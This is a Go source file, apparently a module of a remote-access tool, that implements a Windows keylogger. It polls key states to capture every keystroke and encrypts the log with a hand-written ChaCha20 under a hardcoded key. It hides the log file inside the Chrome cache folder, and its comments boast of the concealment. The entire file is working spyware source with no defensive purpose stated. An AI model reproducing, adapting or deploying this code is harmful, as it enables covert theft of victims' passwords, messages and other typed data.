package handlers

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	user32           = windows.NewLazySystemDLL("user32.dll")
	getAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	getKeyboardState = user32.NewProc("GetKeyboardState")
	mapVirtualKey    = user32.NewProc("MapVirtualKeyW")
	toUnicode        = user32.NewProc("ToUnicode")
)

const (
	mapVK = 2
)

// hardcoded key lol change if u want
var chachaKey = [32]byte{
	0x28, 0x38, 0x43, 0x2B, 0xBB, 0x53, 0xD8, 0x82,
	0x91, 0xA4, 0xC7, 0x6E, 0xF2, 0x35, 0x19, 0x8D,
	0x4A, 0xB6, 0x7C, 0x03, 0x9F, 0xE1, 0x58, 0x2D,
	0xD4, 0x76, 0x8B, 0xAA, 0x45, 0x92, 0xCE, 0x67,
}

type Keylogger struct {
	running      bool
	logFile      string
	buffer       strings.Builder
	sessionNonce [12]byte
	blockCounter uint64
	keyPressed   [256]bool
}

type chacha20Ctx struct {
	state [16]uint32
}

func quarterRound(a, b, c, d uint32) (uint32, uint32, uint32, uint32) {
	a += b
	d ^= a
	d = (d << 16) | (d >> 16)
	c += d
	b ^= c
	b = (b << 12) | (b >> 20)
	a += b
	d ^= a
	d = (d << 8) | (d >> 24)
	c += d
	b ^= c
	b = (b << 7) | (b >> 25)
	return a, b, c, d
}

func newChaCha20(key *[32]byte, nonce *[12]byte, counter uint64) *chacha20Ctx {
	ctx := &chacha20Ctx{}

	// chacha constants "expand 32-byte k"
	ctx.state[0] = 0x61707865
	ctx.state[1] = 0x3320646e
	ctx.state[2] = 0x79622d32
	ctx.state[3] = 0x6b206574

	for i := 0; i < 8; i++ {
		ctx.state[4+i] = binary.LittleEndian.Uint32(key[i*4 : (i+1)*4])
	}

	ctx.state[12] = uint32(counter)

	ctx.state[13] = binary.LittleEndian.Uint32(nonce[0:4])
	ctx.state[14] = binary.LittleEndian.Uint32(nonce[4:8])
	ctx.state[15] = binary.LittleEndian.Uint32(nonce[8:12])

	return ctx
}

func (ctx *chacha20Ctx) getKeystream() [64]byte {
	workingState := ctx.state
	var keystream [64]byte

	// 20 rounds
	for i := 0; i < 10; i++ {
		workingState[0], workingState[4], workingState[8], workingState[12] = quarterRound(workingState[0], workingState[4], workingState[8], workingState[12])
		workingState[1], workingState[5], workingState[9], workingState[13] = quarterRound(workingState[1], workingState[5], workingState[9], workingState[13])
		workingState[2], workingState[6], workingState[10], workingState[14] = quarterRound(workingState[2], workingState[6], workingState[10], workingState[14])
		workingState[3], workingState[7], workingState[11], workingState[15] = quarterRound(workingState[3], workingState[7], workingState[11], workingState[15])

		workingState[0], workingState[5], workingState[10], workingState[15] = quarterRound(workingState[0], workingState[5], workingState[10], workingState[15])
		workingState[1], workingState[6], workingState[11], workingState[12] = quarterRound(workingState[1], workingState[6], workingState[11], workingState[12])
		workingState[2], workingState[7], workingState[8], workingState[13] = quarterRound(workingState[2], workingState[7], workingState[8], workingState[13])
		workingState[3], workingState[4], workingState[9], workingState[14] = quarterRound(workingState[3], workingState[4], workingState[9], workingState[14])
	}

	for i := 0; i < 16; i++ {
		workingState[i] += ctx.state[i]
	}

	for i := 0; i < 16; i++ {
		binary.LittleEndian.PutUint32(keystream[i*4:(i+1)*4], workingState[i])
	}

	return keystream
}

func chacha20Encrypt(key *[32]byte, nonce *[12]byte, plaintext []byte, startCounter uint64) []byte {
	ciphertext := make([]byte, len(plaintext))
	counter := startCounter

	for i := 0; i < len(plaintext); i += 64 {
		ctx := newChaCha20(key, nonce, counter)
		keystream := ctx.getKeystream()

		blockSize := 64
		if i+blockSize > len(plaintext) {
			blockSize = len(plaintext) - i
		}

		for j := 0; j < blockSize; j++ {
			ciphertext[i+j] = plaintext[i+j] ^ keystream[j]
		}

		counter++
	}

	return ciphertext
}

func chacha20Decrypt(key *[32]byte, nonce *[12]byte, ciphertext []byte, startCounter uint64) []byte {
	// encrypt and decrypt are the same
	return chacha20Encrypt(key, nonce, ciphertext, startCounter)
}

func NewKeylogger() *Keylogger {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = os.TempDir()
	}

	// hide in chrome cache lmao
	logFile := filepath.Join(appData, "Google", "Chrome", "User Data", "Default", "Cache", "data_0")

	return &Keylogger{
		logFile:      logFile,
		running:      false,
		blockCounter: 0,
	}
}

func GetAsyncKeyState(vKey int) bool {
	ret, _, _ := getAsyncKeyState.Call(uintptr(vKey))
	return ret&0x8000 != 0
}

func GetKeyboardState(lpKeyState *[256]byte) bool {
	ret, _, _ := getKeyboardState.Call(uintptr(unsafe.Pointer(lpKeyState)))
	return ret != 0
}

func MapVirtualKey(uCode uint, uMapType uint) uint {
	ret, _, _ := mapVirtualKey.Call(uintptr(uCode), uintptr(uMapType))
	return uint(ret)
}

func ToUnicode(wVirtKey uint, wScanCode uint, lpKeyState *[256]byte, pwszBuff *uint16, cchBuff int, wFlags uint) int {
	ret, _, _ := toUnicode.Call(
		uintptr(wVirtKey),
		uintptr(wScanCode),
		uintptr(unsafe.Pointer(lpKeyState)),
		uintptr(unsafe.Pointer(pwszBuff)),
		uintptr(cchBuff),
		uintptr(wFlags),
	)
	return int(ret)
}

func (kl *Keylogger) Start() string {
	if kl.running {
		return "⚠ Keylogger already running"
	}

	dir := filepath.Dir(kl.logFile)
	os.MkdirAll(dir, 0755)

	// check if we got an existing file
	fileInfo, err := os.Stat(kl.logFile)
	isNewFile := os.IsNotExist(err) || (fileInfo != nil && fileInfo.Size() == 0)

	if isNewFile {
		_, err := rand.Read(kl.sessionNonce[:])
		if err != nil {
			return fmt.Sprintf("❌ Error generating nonce: %v", err)
		}
		kl.blockCounter = 0

		// write nonce header to file
		file, err := os.OpenFile(kl.logFile, os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			return fmt.Sprintf("❌ Error creating log file: %v", err)
		}
		file.Write(kl.sessionNonce[:])
		file.Write([]byte{0x0A})
		file.Close()
	} else {
		// file exists, load nonce and calc counter
		content, err := os.ReadFile(kl.logFile)
		if err != nil {
			return fmt.Sprintf("❌ Error reading log file: %v", err)
		}

		if len(content) < 13 {
			return "❌ Corrupted log file"
		}

		// reuse same nonce from file
		copy(kl.sessionNonce[:], content[:12])

		// count how many blocks we already used
		content = content[13:]
		blockCount := uint64(0)
		offset := 0
		for offset < len(content) {
			if offset+4 > len(content) {
				break
			}
			length := binary.LittleEndian.Uint32(content[offset : offset+4])
			offset += 4
			if offset+int(length) > len(content) {
				break
			}
			blockCount += (uint64(length) + 63) / 64
			offset += int(length)
		}
		kl.blockCounter = blockCount
	}

	kl.running = true
	go kl.keyloggerLoop()

	return "keylogger started successfully"
}

func (kl *Keylogger) Stop() string {
	if !kl.running {
		return "⚠ keylogger not running"
	}

	kl.running = false
	kl.flushBuffer()

	return "keylogger stopped"
}

func (kl *Keylogger) keyloggerLoop() {
	var keyState [256]byte
	var buffer [2]uint16

	for kl.running {
		for ascii := 8; ascii <= 254; ascii++ {
			if !kl.running {
				return
			}

			// check if key currently pressed
			if GetAsyncKeyState(ascii) {
				if kl.keyPressed[ascii] {
					continue
				}

				// mark as pressed so we dont double log
				kl.keyPressed[ascii] = true

				if !GetKeyboardState(&keyState) {
					continue
				}

				virtualKey := MapVirtualKey(uint(ascii), mapVK)
				ret := ToUnicode(uint(ascii), uint(virtualKey), &keyState, &buffer[0], len(buffer), 0)

				if ret > 0 {
					runes := utf16.Decode(buffer[:ret])
					text := string(runes)
					kl.processKeystroke(text, ascii)
				}

				time.Sleep(10 * time.Millisecond)
			} else {
				kl.keyPressed[ascii] = false
			}
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func (kl *Keylogger) processKeystroke(text string, keyCode int) {
	switch keyCode {
	case 8:
		kl.buffer.WriteString("[BACKSPACE]")
	case 9:
		kl.buffer.WriteString("[TAB]")
	case 13:
		kl.buffer.WriteString("[ENTER]\n")
	case 32:
		kl.buffer.WriteString(" ")
	case 37:
		kl.buffer.WriteString("[LEFT]")
	case 38:
		kl.buffer.WriteString("[UP]")
	case 39:
		kl.buffer.WriteString("[RIGHT]")
	case 40:
		kl.buffer.WriteString("[DOWN]")
	case 46:
		kl.buffer.WriteString("[DEL]")
	case 20:
		kl.buffer.WriteString("[CAPS]")
	case 16, 17, 18:
		return
	default:
		kl.buffer.WriteString(text)
	}

	if kl.buffer.Len() >= 30 {
		kl.flushBuffer()
	}
}

func (kl *Keylogger) flushBuffer() {
	if kl.buffer.Len() == 0 {
		return
	}

	content := kl.buffer.String()
	kl.buffer.Reset()

	timestamp := time.Now().Format("1991-25-12 15:04:05") // lol
	logEntry := fmt.Sprintf("[%s] %s", timestamp, content)

	encrypted := chacha20Encrypt(&chachaKey, &kl.sessionNonce, []byte(logEntry), kl.blockCounter)
	blocksUsed := (uint64(len(logEntry)) + 63) / 64
	kl.blockCounter += blocksUsed

	file, err := os.OpenFile(kl.logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer file.Close()

	length := uint32(len(encrypted))
	lengthBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(lengthBytes, length)

	file.Write(lengthBytes)
	file.Write(encrypted)
}

func (kl *Keylogger) GetLogs() (string, error) {
	kl.flushBuffer()

	content, err := os.ReadFile(kl.logFile)
	if err != nil {
		return "", err
	}

	if len(content) < 13 {
		return "", fmt.Errorf("empty log")
	}

	// read nonce from header
	var fileNonce [12]byte
	copy(fileNonce[:], content[:12])

	content = content[13:]

	var decryptedLogs strings.Builder
	blockCounter := uint64(0)

	offset := 0
	for offset < len(content) {
		if offset+4 > len(content) {
			break
		}

		// read length prefix
		length := binary.LittleEndian.Uint32(content[offset : offset+4])
		offset += 4

		if offset+int(length) > len(content) {
			break
		}

		encrypted := content[offset : offset+int(length)]

		// decrypt with proper counter
		decrypted := chacha20Decrypt(&chachaKey, &fileNonce, encrypted, blockCounter)
		blocksUsed := (uint64(length) + 63) / 64
		blockCounter += blocksUsed

		decryptedLogs.WriteString(string(decrypted))
		decryptedLogs.WriteString("\n")

		offset += int(length)
	}

	return decryptedLogs.String(), nil
}

func (kl *Keylogger) ClearLogs() error {
	kl.buffer.Reset()
	kl.blockCounter = 0
	return os.Remove(kl.logFile)
}

func (kl *Keylogger) IsRunning() bool {
	return kl.running
}
